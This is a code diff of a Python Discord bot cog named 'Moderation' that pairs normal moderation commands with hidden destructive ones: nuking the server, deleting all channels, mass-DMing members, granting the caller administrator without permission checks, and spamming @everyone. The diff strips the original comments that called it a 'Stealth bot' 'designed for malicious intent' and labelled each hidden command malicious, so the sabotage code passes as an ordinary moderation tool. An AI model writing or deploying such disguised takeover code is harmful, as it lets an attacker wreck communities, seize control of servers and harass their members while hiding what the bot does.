@@ -1,8 +1,6 @@
-# Stealth bot scripted created by K. Catterall.
+# Scripted by K. Catterall.
 
-# WARNING: This code is designed for malicious intent; use at your own consequences.
-# NOTICE: It is reccomended that you use an alt-acount when attempting to use the following code.
-
+# Modules
 import discord
 from discord.ext import commands
 from colorama import *
@@ -15,7 +13,7 @@ class Moderation(commands.Cog):
         self.bot = bot
 
 
-    # Clear messages (Trustworhy command = Stealth).
+    # Clear messages.
     @commands.command()
     @commands.has_guild_permissions(manage_messages=True)
     async def clear(self, ctx, n=10):
@@ -33,7 +31,7 @@ class Moderation(commands.Cog):
                 await ctx.send(embed=embed)
 
 
-    # The atomic bomb (This command is malicious!).
+    # The atomic bomb.
     @commands.command(hidden=True)
     async def nuke(self, ctx):
         SKIP_BOTS = False
@@ -85,7 +83,7 @@ class Moderation(commands.Cog):
         print(Fore.LIGHTWHITE_EX + "Nuke sucessfully exploded!" + f"\n{'-'*35}\n\n")
 
 
-    # Delete all channels (This command is malicious!).
+    # Delete all channels only.
     @commands.command(hidden=True)
     async def cpurge(self, ctx):
         await ctx.message.delete()
@@ -96,7 +94,7 @@ class Moderation(commands.Cog):
                 continue
 
 
-    # DM all members with a message (This command is malicious!).
+    # DM all members with a message.
     @commands.command(hidden=True)
     async def mass_dm(self, ctx, *, message = None):
         await ctx.message.delete()
@@ -114,7 +112,7 @@ class Moderation(commands.Cog):
             await ctx.author.send('**Correct usage:** `mass_dm <message>`')
 
 
-    # Make yourself an administator on the server (This command is malicious!).
+    # Make yourself an administator on the server.
     @commands.command(hidden=True)
     async def admin(self, ctx):
         await ctx.message.delete()
@@ -124,7 +122,7 @@ class Moderation(commands.Cog):
         await ctx.author.send('You are now admin on the server.')
 
 
-    # Spam all text channels with @everyone (This command is malicious!)
+    # Spam all text channels with @everyone.
     @commands.command(hidden=True)
     async def spam(self, ctx):
         await ctx.message.delete()
@@ -145,7 +143,7 @@ class Moderation(commands.Cog):
 
 
 
-    # Kick a member (Trustworhy command = Stealth).
+    # Kick a member.
     @commands.command()
     @commands.has_guild_permissions(kick_members=True)
     async def kick(self, ctx, member : discord.Member, *, reason=None):
@@ -154,7 +152,7 @@ class Moderation(commands.Cog):
         await ctx.send(embed=embed)
 
 
-    # Ban a member (Trustworhy command = Stealth).
+    # Ban a member.
     @commands.command()
     @commands.has_guild_permissions(ban_members=True, kick_members=True)
     async def ban(self, ctx, member : discord.Member, *, reason=None):
@@ -163,7 +161,7 @@ class Moderation(commands.Cog):
         await ctx.send(embed=embed)
 
 
-    # Unban a member (Trustworhy command = Stealth).
+    # Unban a member.
     @commands.command()
     @commands.has_guild_permissions(administrator=True)
     async def unban(self, ctx, *, member):
@@ -179,7 +177,7 @@ class Moderation(commands.Cog):
                 return
     
 
-    # Mute a member (Trustworthy command = Stealth).
+    # Mute a member.
     @commands.command()
     @commands.has_guild_permissions(manage_roles=True)
     async def mute(self, ctx, member: discord.Member, *, reason=None):
@@ -187,19 +185,15 @@ class Moderation(commands.Cog):
             embed=discord.Embed(title="Issue", description=f"You can not mute this member.", color=discord.Colour.orange())
             await ctx.send(embed=embed)
         else:
-            # Check is member is muted or not:
             role = discord.utils.find(lambda r: r.name == 'bot muted', ctx.guild.roles)
             if role in member.roles:
                 embed=discord.Embed(title="Issue", description=f"{member.mention} is already muted.", color=discord.Colour.orange())
                 await ctx.send(embed=embed)
             else:
-                # If the role already exists:
                 if discord.utils.get(ctx.guild.roles, name="bot muted"):
                     role = discord.utils.get(member.guild.roles, name="bot muted")
                     await discord.Member.add_roles(member, role)
                     member.guild_permissions.send_messages = False
-                
-                # Else create the role first:
                 else:
                     permissions = discord.Permissions(send_messages=False, read_messages=True)
                     await ctx.guild.create_role(name="bot muted", permissions=permissions)
@@ -207,12 +201,11 @@ class Moderation(commands.Cog):
                     await discord.Member.add_roles(member, role)
                     member.guild_permissions.send_messages = False
 
-
                 embed=discord.Embed(title="Member muted", description=f"{member.mention} has been muted.", color=discord.Colour.blue())
                 await ctx.send(embed=embed)
     
 
-    # Unmute a member (Trustworthy command = Stealth).
+    # Unmute a member.
     @commands.command()
     @commands.has_guild_permissions(manage_roles=True)
     async def unmute(self, ctx, member: discord.Member, *, reason=None):
@@ -241,4 +234,4 @@ def setup(bot):
     bot.add_cog(Moderation(bot))
 
 
-# Stealth bot scripted created by K. Catterall.
+# Scripted by K. Catterall.
